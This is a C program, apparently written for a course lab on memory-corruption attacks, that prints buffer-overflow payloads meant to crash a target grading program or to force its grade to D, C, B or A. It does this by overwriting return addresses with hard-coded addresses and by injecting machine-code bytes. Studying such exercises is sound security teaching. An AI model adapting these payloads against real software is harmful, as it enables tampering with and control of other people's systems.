#include <stdio.h>

int main(int argc, char *argv[])
{
   if(argc != 2)
   {
	printf("WARNING : Wrong Usage of trigger.\n\
               <e> for segfault.\n\
               <d> for grade D.\n\
               <c> for grade C.\n\
               <b> for grade B.\n\
               <a> for grade A.\n");
        exit(0);
   }
   char lol[159];
   int i = 0;
   lol[i++] = 'M';
   lol[i++] = 'H';
   lol[i++] = 'S';
   lol[i++] = 'S';
   lol[i++] = 'S';
   lol[i++] = 'K';
   char opt = *argv[1];
   switch (opt) {
	case 'e' :
		//Seg Fault
		//Stuff buf with 0 to overrite checkName address
   		for(i = 6; i<76; i++)
   			lol[i++] = ((0x0f & '0') << 4 ) | (0x0f & '0');

		//Output all the characters
   		for(i = 0; i<74; i++)
			putchar(lol[i]);
                  break;
        case 'd' :
		//Grade D
		//Stuff buf with 0
   		for(i = 6; i<72; i++)
   			lol[i++] = ((0x0f & '0') << 4 ) | (0x0f & '0');

		//Change the checkName address to setGradeToD
   		lol[i++] = ((0x0f & 'k') << 4 ) | (0x0f & '8');
   		lol[i++] = ((0x0f & '0') << 4 ) | (0x0f & '7');
   		lol[i++] = ((0x0f & '4') << 4 ) | (0x0f & '0');

		//Output all the characters
   		for(i = 0; i<75; i++)
			putchar(lol[i]);
		  break;
	case 'c' :
		//Set grade to C
		//Initialize buff with 0
   		for (i=6;i<126;i++) 
       			lol[i] = ((0x0f & '0') << 4) | (0x0f & '0');

		//Keep the address of checkName Intact
   		i=72;
   		lol[i++] = ((0x0f & '5') << 4) | (0x0f & '9');
   		lol[i++] = ((0x0f & '0') << 4) | (0x0f & '8');
   		lol[i++] = ((0x0f & '4') << 4) | (0x0f & '0');
   		lol[i++] = ((0x0f & '0') << 4) | (0x0f & '0');
   		lol[i++] = ((0x0f & '0') << 4) | (0x0f & '0');
   		lol[i++] = ((0x0f & '0') << 4) | (0x0f & '0');
   		lol[i++] = ((0x0f & '0') << 4) | (0x0f & '0');
   		lol[i++] = ((0x0f & '0') << 4) | (0x0f & '0');

   		//Change the return address to point at address of Grade C
   		i=120;
   		lol[i++] = ((0x0f & '1') << 4 ) | (0x0f & 'n');
   		lol[i++] = ((0x0f & '0') << 4 ) | (0x0f & '8');
   		lol[i++] = ((0x0f & '4') << 4 ) | (0x0f & '0');

		//Output all the characters
   		for(i = 0; i<123; i++)
			putchar(lol[i]);
                break;
        case 'b' :
		//Set Grade to B
		//Stuff to make input 8 aligned
   		for (i=6;i<8;i++)
       			lol[i] = ((0x0f & '0') << 4) | (0x0f & '0');

		//Attack code to overrite grade
   		lol[i++] = ((0x0f & 'l') << 4) | (0x0f & '6');
   		lol[i++] = ((0x0f & '0') << 4) | (0x0f & '5');
   		lol[i++] = ((0x0f & 'k') << 4) | (0x0f & '5');
   		lol[i++] = ((0x0f & 'o') << 4) | (0x0f & 'o');
   		lol[i++] = ((0x0f & 'o') << 4) | (0x0f & 'o');
   		lol[i++] = ((0x0f & 'o') << 4) | (0x0f & 'o');
   		lol[i++] = ((0x0f & '4') << 4) | (0x0f & '2');
   		lol[i++] = ((0x0f & '4') << 4) | (0x0f & '8');
   		lol[i++] = ((0x0f & 'l') << 4) | (0x0f & '7');
   		lol[i++] = ((0x0f & 'l') << 4) | (0x0f & '0');
   		lol[i++] = ((0x0f & '8') << 4) | (0x0f & 'l');
   		lol[i++] = ((0x0f & '4') << 4) | (0x0f & 'm');
   		lol[i++] = ((0x0f & '6') << 4) | (0x0f & '3');
   		lol[i++] = ((0x0f & '0') << 4) | (0x0f & '1');
   		lol[i++] = ((0x0f & '4') << 4) | (0x0f & '8');
   		lol[i++] = ((0x0f & 'l') << 4) | (0x0f & '7');
   		lol[i++] = ((0x0f & 'l') << 4) | (0x0f & '3');
   		lol[i++] = ((0x0f & '6') << 4) | (0x0f & '7');
   		lol[i++] = ((0x0f & '4') << 4) | (0x0f & '5');
   		lol[i++] = ((0x0f & '2') << 4) | (0x0f & '3');
   		lol[i++] = ((0x0f & '0') << 4) | (0x0f & '1');
   		lol[i++] = ((0x0f & '4') << 4) | (0x0f & '8');
   		lol[i++] = ((0x0f & '2') << 4) | (0x0f & '9');
   		lol[i++] = ((0x0f & 'm') << 4) | (0x0f & '8');
   		lol[i++] = ((0x0f & 'o') << 4) | (0x0f & 'o');
   		lol[i++] = ((0x0f & 'n') << 4) | (0x0f & '0');

		//Initialize buff with 0
   		for (i=34;i<120;i++) 
       			lol[i] = ((0x0f & '0') << 4) | (0x0f & '0');

		//Keep the address of checkName intact
   		i=72;
   		lol[i++] = ((0x0f & '5') << 4) | (0x0f & '9');
   		lol[i++] = ((0x0f & '0') << 4) | (0x0f & '8');
   		lol[i++] = ((0x0f & '4') << 4) | (0x0f & '0');
   		lol[i++] = ((0x0f & '0') << 4) | (0x0f & '0');
   		lol[i++] = ((0x0f & '0') << 4) | (0x0f & '0');
   		lol[i++] = ((0x0f & '0') << 4) | (0x0f & '0');
   		lol[i++] = ((0x0f & '0') << 4) | (0x0f & '0');
   		lol[i++] = ((0x0f & '0') << 4) | (0x0f & '0');

   		//Change the return address to attack code
   		i=120;
   		lol[i++] = ((0x0f & 'l') << 4 ) | (0x0f & '8');
   		lol[i++] = ((0x0f & '0') << 4 ) | (0x0f & 'm');
   		lol[i++] = ((0x0f & '6') << 4 ) | (0x0f & '0');

		//send all the characters
   		for(i = 0; i<123; i++)
			putchar(lol[i]);
		  break;
	case 'a' :
		//Grade A
		//Stuff 0 till 8 to make it 8 aligned
   		for (i=6;i<8;i++)
       			lol[i] = ((0x0f & '0') << 4) | (0x0f & '0');

   		//Set the grade to A and jump to location where it prints the Grade
   		lol[i++] = ((0x0f & 'l') << 4) | (0x0f & '6');
   		lol[i++] = ((0x0f & '0') << 4) | (0x0f & '5');
   		lol[i++] = ((0x0f & 'k') << 4) | (0x0f & '5');
   		lol[i++] = ((0x0f & 'o') << 4) | (0x0f & 'o');
   		lol[i++] = ((0x0f & 'o') << 4) | (0x0f & 'o');
   		lol[i++] = ((0x0f & 'o') << 4) | (0x0f & 'o');
   		lol[i++] = ((0x0f & '4') << 4) | (0x0f & '1');
   		lol[i++] = ((0x0f & '4') << 4) | (0x0f & '8');
   		lol[i++] = ((0x0f & 'l') << 4) | (0x0f & '7');
   		lol[i++] = ((0x0f & 'l') << 4) | (0x0f & '0');
   		lol[i++] = ((0x0f & '8') << 4) | (0x0f & 'l');
   		lol[i++] = ((0x0f & '4') << 4) | (0x0f & 'm');
   		lol[i++] = ((0x0f & '6') << 4) | (0x0f & '3');
   		lol[i++] = ((0x0f & '0') << 4) | (0x0f & '1');
   		lol[i++] = ((0x0f & '4') << 4) | (0x0f & '8');
   		lol[i++] = ((0x0f & 'l') << 4) | (0x0f & '7');
   		lol[i++] = ((0x0f & 'l') << 4) | (0x0f & '3');
   		lol[i++] = ((0x0f & '6') << 4) | (0x0f & '7');
   		lol[i++] = ((0x0f & '4') << 4) | (0x0f & '5');
   		lol[i++] = ((0x0f & '2') << 4) | (0x0f & '3');
   		lol[i++] = ((0x0f & '0') << 4) | (0x0f & '1');
   		lol[i++] = ((0x0f & '4') << 4) | (0x0f & '8');
   		lol[i++] = ((0x0f & '2') << 4) | (0x0f & '9');
   		lol[i++] = ((0x0f & 'm') << 4) | (0x0f & '8');
   		lol[i++] = ((0x0f & 'o') << 4) | (0x0f & 'o');
   		lol[i++] = ((0x0f & 'n') << 4) | (0x0f & '0');

		//Initialize whole buff with 0
   		for (i=34;i<159;i++)
       			lol[i] = ((0x0f & '0') << 4) | (0x0f & '0');

   		//Keep the checkName memory location intact at location 1
   		i=72;
   		lol[i++] = ((0x0f & '5') << 4) | (0x0f & '9');
   		lol[i++] = ((0x0f & '0') << 4) | (0x0f & '8');
   		lol[i++] = ((0x0f & '4') << 4) | (0x0f & '0');
   		lol[i++] = ((0x0f & '0') << 4) | (0x0f & '0');
   		lol[i++] = ((0x0f & '0') << 4) | (0x0f & '0');
   		lol[i++] = ((0x0f & '0') << 4) | (0x0f & '0');
   		lol[i++] = ((0x0f & '0') << 4) | (0x0f & '0');
   		lol[i++] = ((0x0f & '0') << 4) | (0x0f & '0');

   		//Keep the checkName memory location intact at location 2
   		i=88;
   		lol[i++] = ((0x0f & '5') << 4) | (0x0f & '9');
   		lol[i++] = ((0x0f & '0') << 4) | (0x0f & '8');
   		lol[i++] = ((0x0f & '4') << 4) | (0x0f & '0');
   		lol[i++] = ((0x0f & '0') << 4) | (0x0f & '0');
   		lol[i++] = ((0x0f & '0') << 4) | (0x0f & '0');
   		lol[i++] = ((0x0f & '0') << 4) | (0x0f & '0');
   		lol[i++] = ((0x0f & '0') << 4) | (0x0f & '0');
   		lol[i++] = ((0x0f & '0') << 4) | (0x0f & '0');

   		//Keep the checkName memory location intact at location 3
   		i=104;
   		lol[i++] = ((0x0f & '5') << 4) | (0x0f & '9');
   		lol[i++] = ((0x0f & '0') << 4) | (0x0f & '8');
   		lol[i++] = ((0x0f & '4') << 4) | (0x0f & '0');
   		lol[i++] = ((0x0f & '0') << 4) | (0x0f & '0');
   		lol[i++] = ((0x0f & '0') << 4) | (0x0f & '0');
   		lol[i++] = ((0x0f & '0') << 4) | (0x0f & '0');
   		lol[i++] = ((0x0f & '0') << 4) | (0x0f & '0');
   		lol[i++] = ((0x0f & '0') << 4) | (0x0f & '0');

   		//Change the return intruction to the attack code at Location 1
   		i=120;
   		lol[i++] = ((0x0f & 'l') << 4 ) | (0x0f & '8');
   		lol[i++] = ((0x0f & '0') << 4 ) | (0x0f & 'm');
   		lol[i++] = ((0x0f & '6') << 4 ) | (0x0f & '0');

   		//Change the return intruction to the attack code at Location 1
   		i=136;
   		lol[i++] = ((0x0f & 'l') << 4 ) | (0x0f & '8');
   		lol[i++] = ((0x0f & '0') << 4 ) | (0x0f & 'm');
   		lol[i++] = ((0x0f & '6') << 4 ) | (0x0f & '0');

   		//Change the return intruction to the attack code at Location 1
   		i=152;
   		lol[i++] = ((0x0f & 'l') << 4 ) | (0x0f & '8');
   		lol[i++] = ((0x0f & '0') << 4 ) | (0x0f & 'm');
   		lol[i++] = ((0x0f & '6') << 4 ) | (0x0f & '0');

		//Output all the characters
   		for(i = 0; i<159; i++)
			putchar(lol[i]);
                  break;
	case 's' :
                //Sandbox
                //Send 00
   		for (i=6;i<104;i++) 
       			lol[i] = ((0x0f & '0') << 4) | (0x0f & '0');

                //Overrite the return address
   		lol[i++] = ((0x0f & 'n') << 4) | (0x0f & '3');
   		lol[i++] = ((0x0f & '2') << 4) | (0x0f & '8');
   		lol[i++] = ((0x0f & '4') << 4) | (0x0f & '0');

                //Output all the characters
   		for(i = 0; i<107; i++)
			putchar(lol[i]);
                break;
   }
}

